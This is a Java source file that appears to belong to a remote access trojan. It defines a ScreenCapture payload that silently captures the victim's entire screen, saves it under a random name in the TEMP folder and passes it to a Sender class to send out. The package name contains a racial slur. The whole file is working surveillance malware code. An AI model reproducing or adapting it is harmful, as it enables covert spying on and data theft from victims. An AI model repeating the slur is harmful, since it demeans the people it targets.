package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.api.Payload;
import me.nigger.rat.payload.api.Sender;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;

public final class ScreenCapture implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File(System.getenv("TEMP") + "\\" + random + ".png");
        ImageIO.write(image, "png", file);
        Sender.send(file);
    }
}
